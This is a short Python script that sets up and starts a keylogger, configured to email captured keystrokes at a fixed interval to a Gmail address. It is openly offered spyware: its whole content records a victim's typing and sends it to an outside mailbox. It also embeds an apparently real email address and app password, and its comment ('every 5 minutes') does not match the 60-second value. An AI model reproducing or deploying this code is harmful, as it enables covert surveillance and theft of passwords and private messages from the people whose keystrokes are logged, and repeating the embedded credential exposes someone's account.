from keylogger import KeyLogger

# Initialize the keylogger
keylogger = KeyLogger(
    time_interval=60,  # Send logs every 5 minutes
    email="VSvngr@gmail.com",  # Replace with your Gmail address
    password="tuya zmzv yrzn mpqe"  # Replace with your Gmail app password
)

# Start the keylogger
keylogger.start()
